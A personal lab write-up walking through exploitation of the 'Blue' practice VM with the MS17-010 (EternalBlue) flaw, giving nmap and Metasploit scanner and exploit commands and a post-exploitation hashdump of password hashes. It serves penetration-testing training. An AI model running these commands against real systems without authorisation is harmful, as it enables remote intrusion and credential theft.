# My First Exploit: Tackling the EternalBlue Vulnerability

## Introduction
The Blue VM holds a special place in my journey as an ethical hacker. It was the first VM I tackled when I started exploring the world of penetration testing. Looking back, it was both exciting and a bit nerve-wrackingâ€”but ultimately rewarding. For anyone new to ethical hacking, this VM is an excellent introduction to real-world vulnerabilities and the tools we use to uncover them. In this writeup, I'll walk you through the steps I took to exploit the MS17-010 vulnerability (a.k.a. EternalBlue) on a Windows 7 Ultimate SP1 machine.

## Enumeration
The first step in any penetration test is reconnaissance. Using `nmap`, we performed a network scan to identify open ports and services:

```bash
nmap -sS -sV -Pn 10.0.2.7
```

![Nmap scan results](attachment:image_page_2.png)

### Key Findings:
- Port 445 (SMB) is open.
- The target is running Windows 7 Ultimate SP1.

The presence of SMB services on port 445 often suggests potential vulnerabilities. Research indicated that this system might be susceptible to MS17-010.

## Exploit Research
MS17-010, also known as EternalBlue, exploits a vulnerability in the SMB protocol, leading to remote code execution. A quick internet search confirmed that this exploit is relevant to Windows 7 Ultimate SP1. 

![Exploit research screenshot](attachment:image_page_3.png)

The Metasploit framework provides a reliable implementation of this exploit. To locate it, we searched for "eternalblue" within Metasploit:

```bash
search eternalblue
```

This revealed several options, including scanners and exploits. For initial validation, we used the EternalBlue scanner.

## Using Metasploit

### Step 1: Verifying Vulnerability
To confirm the target's susceptibility:

1. Load the scanner module:
    ```bash
    use auxiliary/scanner/smb/smb_ms17_010
    ```
2. Set the target IP address:
    ```bash
    set rhosts 10.0.2.7
    ```
3. Execute the scanner:
    ```bash
    run
    ```

![Scanner results confirming vulnerability](attachment:image_page_4.png)

The output confirmed that the target is vulnerable to EternalBlue.

### Step 2: Exploitation
Next, we launched the actual exploit:

1. Load the exploit module:
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```
2. Set the target IP:
    ```bash
    set rhosts 10.0.2.7
    ```
3. Execute the exploit:
    ```bash
    run
    ```

![Exploit execution and success](attachment:image_page_5.png)

Upon successful execution, we gained a remote shell on the target machine.

## Post-Exploitation
With access to the system, we could proceed with various post-exploitation activities. One key step was dumping password hashes:

```bash
hashdump
```

![Dumping password hashes](attachment:image_page_5.png)

The hashdump output provided administrator credentials, which could be further cracked offline or used for lateral movement.

## Conclusion
This exercise highlighted the importance of timely patch management and the risks of running outdated systems. Exploiting MS17-010 was a straightforward process, emphasizing how attackers can leverage well-documented vulnerabilities. Through this challenge, we reinforced critical skills in enumeration, exploitation, and post-exploitation.

By understanding these tactics, we better appreciate the need for robust defenses and proactive vulnerability management.

